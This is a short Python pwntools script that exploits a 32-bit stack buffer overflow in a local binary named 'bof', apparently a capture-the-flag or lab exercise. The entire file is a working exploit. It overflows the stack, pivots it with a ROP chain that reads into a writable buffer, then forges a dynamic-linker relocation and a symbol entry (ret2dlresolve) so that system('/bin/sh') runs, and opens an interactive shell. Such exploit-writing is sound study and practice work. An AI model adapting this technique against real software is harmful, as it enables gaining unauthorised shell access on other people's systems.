#!/usr/bin/env python
from pwn import *
context.arch = 'i386'

r = process('/tmp/p/bof')
trash = 'a'*112
buf = 0x0804b000 - 0x100
read = 0x80483a0
write = 0x80483d0
write_got = 0x804a01c
leave_ret = 0x08048458
pop_ebp_ret = 0x0804861b
pop3_ret = 0x08048619

pay1 = trash + flat([read, pop3_ret, 0, buf, 100, pop_ebp_ret, buf, leave_ret])
r.send(pay1)

cmd = '/bin/sh'
rel_plt = 0x8048330
dynsym = 0x80481d8
dynstr = 0x8048278
plt_0 = 0x08048380
index = buf + 28 - rel_plt 
fake_sym_addr = buf + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr += align
dynsym_index = (fake_sym_addr - dynsym) / 0x10
r_info = (dynsym_index << 8) | 0x7 
fake_reloc = flat([write_got, r_info])
fake_sym = flat([fake_sym_addr + 0x10 - dynstr, 0, 0, 0x12])

pay2 = flat([0, plt_0, index, 0, buf+80, 0, 0, fake_reloc, 0,  fake_sym, 'system\x00'])
pay2 = pay2.ljust(80,'a')
pay2+= cmd + '\x00'

r.send(pay2)

r.interactive()